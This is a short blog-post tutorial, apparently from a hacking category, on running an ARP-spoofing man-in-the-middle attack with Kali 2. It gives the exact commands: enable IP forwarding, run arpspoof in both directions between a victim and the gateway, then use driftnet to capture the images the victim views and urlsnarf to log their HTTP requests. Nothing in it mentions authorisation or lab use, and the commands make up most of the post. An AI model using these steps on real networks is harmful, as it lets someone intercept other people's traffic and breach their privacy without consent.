---
layout: post
title: "How To Perform A Man In The Middle Using Kali 2"
category: Hacking
description: "Learn how to perform a man in the middle using Kali 2 with arpspoof. Caputure images and urls."
---

![Man in the middle](/images/mitm.png)

Today we'll be looking at how to perform a Man In The Middle to capture images and urls by the victim.

Requirements are [Kali 2](https://www.kali.org)

# 1. Open 3 terminals

![Three terminals](/images/step1.png)

# 2. Set up port forwarding

Run this command and if the output is 0 then we need to change it to 1

```bash
$ cat /proc/sys/net/ipv4/ip_forward
```
<br>

```bash
$ echo 1 >> /proc/sys/net/ipv4/ip_forward
```

![Step 2](/images/step2.png)

# 3. Run arpspoof

first

```bash
$ arpspoof -i eth0 targetiphere gatewayiphere
```

![step 3](/images/step3.png)

and then in another terminal

```bash
$ arpspoof -i eth0 gatewayiphere targetiphere
```

![step 4](/images/step4.png)

# 4. Run driftnet

This will capture images opened by the victim and display them in the black box.

```bash
$ driftnet -i eth0
```

![step 5](/images/step5.png)

### Bonus: Run urlsnarf to capture http requests

```bash
$ urlsnarf -i eth0
```
